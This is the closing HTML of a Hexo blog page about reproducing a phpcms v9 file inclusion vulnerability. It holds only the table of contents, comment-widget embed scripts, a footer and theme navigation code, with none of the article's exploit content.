            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#写在前面"><span class="toc-number">1.1.</span> <span class="toc-text">写在前面</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#漏洞产生"><span class="toc-number">2.</span> <span class="toc-text">漏洞产生</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#代码分析"><span class="toc-number">3.</span> <span class="toc-text">代码分析</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#路由分析"><span class="toc-number">3.1.</span> <span class="toc-text">路由分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#漏洞触发"><span class="toc-number">3.2.</span> <span class="toc-text">漏洞触发</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-0x01"><span class="toc-number">3.2.1.</span> <span class="toc-text">POC 0x01</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#POC-0x02"><span class="toc-number">3.2.2.</span> <span class="toc-text">POC 0x02</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#写在后面"><span class="toc-number">3.3.</span> <span class="toc-text">写在后面</span></a></li></ol></li></ol>
        </div>
    </div>
    
  </aside>
</main>

<!-- disqus 公共JS代码 -->
<script type="text/javascript">
  /* * * CONFIGURATION VARIABLES * * */
  var disqus_shortname = "your_disqus_shortname";
  var disqus_identifier = "http://yoursite.com/2019/07/16/phpcmsv9文件包含漏洞-复现/";
  var disqus_url = "http://yoursite.com/2019/07/16/phpcmsv9文件包含漏洞-复现/";

  isAgent(getDisqus)

  // determine user agent in China
  function isAgent(cb) {
    var url = '//graph.facebook.com/feed?callback=h';
    var xhr = new XMLHttpRequest();
    var called = false;
    xhr.open('GET', url);
    xhr.onreadystatechange = function() {
      if (xhr.readyState === 4 && xhr.status === 200) {
      called = true;
      cb(true);
      }
    };
    xhr.send();
    // timeout 1s, this facebook API is very fast.
    setTimeout(function() {
      if (!called) {
      xhr.abort();
      cb(false)
      }
    }, 1000);
  }

  function getDisqus(isAgent) {
    var dsq = document.createElement('script'); dsq.type = 'text/javascript'; 
    dsq.async = true
    dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
    (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq)
  }
</script>
<!-- disqus 公共JS代码 end -->


<script type="text/javascript">
  (function(d, s) {
      var j, e = d.getElementsByTagName(s)[0];

      if (typeof LivereTower === 'function') { return; }

      j = d.createElement(s);
      j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
      j.async = true;

      e.parentNode.insertBefore(j, e);
  })(document, 'script');
</script>


  <footer>
  <div class="copyright">
    <div>
      &copy; 2019 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a>&nbsp
    </div>
    <div>
      Theme by <a href="https://github.com/lewis-geek/hexo-theme-Aath" target="_blank">Aath</a>
    </div>
  </div>
</footer>


<script src="https://cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script>
<script src="/lib/in-view.min.js"></script>
<script src="/lib/lodash.min.js"></script>
<script>
  var isDown = true
  var oldY = 0
  inView.offset(50)

  document.body.addEventListener('touchstart', function(){});
  
  window.addEventListener('scroll', _.throttle(e => {
    var currentY = window.scrollY
    if((oldY - currentY) < 0) {
      isDown = true
    } else {
      isDown = false
    }
    oldY = currentY
  }, 250))

  $("article img").each(function() {
      var strA = "<a data-fancybox='gallery' href='" + this.src + "'></a>";
      $(this).wrapAll(strA);
  });

  $('.toc-link').each(function() {
      var href = $(this).attr("href");
      
      inView(href).on('exit', () => {
        if (isDown) {
          handleActive(href)
        }
      })

      inView(href).on('enter', () => {
        if (!isDown) {
          handleActive(href)
        }
      })

      this.onclick = function(e) {
        var pos = $(href).offset().top - 10;
        $("html,body").animate({scrollTop: pos}, 300);
        setTimeout(() => {
          handleActive(href)
        }, 350)
        return false
      }
  })

  function handleActive(href) {
    document.querySelectorAll('.toc-link').forEach(elm => {
      elm.classList.remove('active')
    })
    document.querySelector(".toc [href='"+ href +"']").classList.add('active')
  }
</script>
<script src="/lib/jquery.fancybox.min.js"></script>


</body>
</html>
